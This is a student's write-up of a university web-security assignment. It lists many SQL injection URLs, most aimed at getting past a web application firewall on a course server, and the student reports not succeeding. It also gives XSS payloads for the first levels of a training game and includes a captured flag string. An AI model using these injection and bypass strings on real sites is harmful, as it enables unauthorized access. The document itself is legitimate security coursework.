# Writeup 1 - Web I

Name: Marco Roxas
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Marco Roxas


### Part 1 (40 Pts)

Such a Quick Little, website!  [http://142.93.136.81:5000/](http://142.93.136.81:5000/)

I wasn't able to find a way to obtain the flag despite a good hint from an instructor. There's a WAF (Web App Firewall) active on the server that I'm not able to find a way to bypass in the time allotted.

Some URL strings that I tried were the following (with some comments):

~~~~
http://142.93.136.81:5000/item?id=OR'1'='1'
http://142.93.136.81:5000/item?id=1&NOT('1'!='1')
http://142.93.136.81:5000/item?id=0&!(1!=1)
http://142.93.136.81:5000/item?id=R O{$id} 1=1;--
http://142.93.136.81:5000/item?id=R "O{$id}" 1=1;--
http://142.93.136.81:5000/item?id=R"O{$id}"1=1;--
http://142.93.136.81:5000/item?id=1OR"O{$id}"1=1;--
http://142.93.136.81:5000/item?1=1&id=1&1=1
http://142.93.136.81:5000/item?1 OR 1&id=1;--
http://142.93.136.81:5000/item?1&id=1;--
http://142.93.136.81:5000/item?1&id=1
http://142.93.136.81:5000/item?1&id=1&1OR1
http://142.93.136.81:5000/item?1&id=1 OR 1=1
~~~~

Basic ideas were tried above, some of which triggered the WAF. It was hoped that using the PHP `$` with variable names can result in bypassing it the WAF.

~~~~
http://142.93.136.81:5000/item?id=0 {$name[1]}{$name[2]} 1=1;--
http://142.93.136.81:5000/item?id=0 $name[1]$name[2] 1=1;--
http://142.93.136.81:5000/item?id=0 $name{2}$name{3} 1=1;--
http://142.93.136.81:5000/item?id=0 $name{0}$name{2} 1=1;--
http://142.93.136.81:5000/item?id=0 "$name{1}$name{2}" 1=1;--
http://142.93.136.81:5000/item?id=0&$name[1]$name[2] 1=1;--
http://142.93.136.81:5000/item?id=0 O$name[2] 1=1;--
http://142.93.136.81:5000/item?id=0 O$name[3] 1=1;--
http://142.93.136.81:5000/item?id=0 $name[1]R 1=1;--
http://142.93.136.81:5000/item?id=0 $name[2]R 1=1;--
http://142.93.136.81:5000/item?id=0 $name[3]R 1=1;--
http://142.93.136.81:5000/item?id=O {$id}R 1=1;--
http://142.93.136.81:5000/item?id=0 and $name{1}$name{2} 1=1;--
~~~~

This is a continuation of utilizing `$`. A nonsensical reference of `$name[1]` was tried since the name field started with `Fortnite` (the word OR is embedded).

~~~~
http://142.93.136.81:5000/item?id=0 " . " OR 1=1;--"
http://142.93.136.81:5000/item?id=0 " . echo \'O\' . "R 1=1;--"
http://142.93.136.81:5000/item?id=0 " . echo "O" . "R 1=1;--"
http://142.93.136.81:5000/item?id=0 " . "O" . "R 1=1;---"
http://142.93.136.81:5000/item?id=0 "."O"."R 1=1;--"
http://142.93.136.81:5000/item?id=2 O" . "R 1=1;--"
http://142.93.136.81:5000/item?id=1 O\0x52 1=1;--"
http://142.93.136.81:5000/item?id=1 O\x52 1=1;--"
http://142.93.136.81:5000/item?id=0 O\122 1=1;--"
http://142.93.136.81:5000/item?id=0 O\R 1=1;--"
http://142.93.136.81:5000/item?id=0 Or 1=1;--"
http://142.93.136.81:5000/item?id=0 \OR 1=1;--"
http://142.93.136.81:5000/item?id=0 \O\x52 1=1;--"
http://142.93.136.81:5000/item?id=1 O" . "R 1=1;--"
http://142.93.136.81:5000/item?id=1 O" "R 1=1;--"
http://142.93.136.81:5000/item?id=0 OR 1=1;--"
http://142.93.136.81:5000/item?id=0 " . "O" . "R 1=1;--"
http://142.93.136.81:5000/item?id=0 " . "O_R 1=1;--"
http://142.93.136.81:5000/item?id=0 ORO 1=1;--
http://142.93.136.81:5000/item?id=0 " . $name[2] . $name[3] ." 1=1;--"
http://142.93.136.81:5000/item?id=0 " . "O" . "R" ." 1=1;--"
http://142.93.136.81:5000/item?id=0 O{$chr(0x52)} 1=1;--"
http://142.93.136.81:5000/item?id=0 O{$chr(82)} 1=1;--"
http://142.93.136.81:5000/item?id=0 . O{$chr(82)} . 1=1;--"
http://142.93.136.81:5000/item?id=0 {$name[1]}{$name[2]} 1=1;--"
http://142.93.136.81:5000/item?id=0 $OR 1=1;--"
http://142.93.136.81:5000/item?id=0 \O\R 1=1;--
http://142.93.136.81:5000/item?id=0 O{$nul}R 1=1;--
http://142.93.136.81:5000/item?id=0 OQ%08R 1=1;--
http://142.93.136.81:5000/item?id=0 O{$_}R 1=1;--
http://142.93.136.81:5000/item?id=0 O/R 1=1;--
http://142.93.136.81:5000/item?id=0 O.R.1=1;--
http://142.93.136.81:5000/item?id=0 CHAR(79)CHAR(82) 1=1;--
http://142.93.136.81:5000/item?id=999999999999999999999999999999999
http://142.93.136.81:5000/item&1=1
http://142.93.136.81:5000/item?id=$PHP_MINOR_VERSION
http://142.93.136.81:5000/item?id=0 O" . "R 1=1;--"
http://142.93.136.81:5000/item?id=0 O#R 1=1;--
http://142.93.136.81:5000/item?id=0&O##R&1=1;--
http://142.93.136.81:5000/item?id=0+O##R+1=1;--
http://142.93.136.81:5000/item?id=0+O%%R+1=1--
http://142.93.136.81:5000/item?id=0 \O\R 1=1; --
~~~~

Finally a few more ideas were tried as shown above, such as utilizing escape sequences like `0x52` and the SQL `CHAR()` function.  Interestingly using `$PHP_MINOR_VERSION` triggered the WAF while a shorter `$PHP_MIN` did not. Bypassing the WAF was also attempted by using `#` or `%`.

For many of these a space character may have been needed between the the semicolon and comment, ie, `; --`.

There is a flag obtainable on the main web page via port 80 of the same server (`CMSC389R-{h1dd3n_1n_plain_5ight}`), however that's not part of this assignment.

### Part 2 (60 Pts)
Complete all 6 levels of:

[https://xss-game.appspot.com](https://xss-game.appspot.com)

The following inputs were used:

~~~~
<script>alert('Hi');</script>

<p onclick="alert('Hi');">Hi</p>

https://xss-game.appspot.com/level3/frame#2.jpg'/><script>alert('Hi');</script>
~~~~

Level 1 just needed javascript within an html `<script>` tag.

Level 2 displayed an element and a `<script>` tag couldn't be used. The `onclick` attribute was tried and worked.

Level 3 required an image tag to be terminated. By right-clicking on the resulting broken image icon and selecting View Image, the proper syntax to use was shown, and with some trial and error a string with starting `'/><script>` was found to work.

Level 4 I think utilized the moustache javascript library (or similar) so some way to escape the javascript code had to be found, which I was not able to in the time allotted to reach the next level.
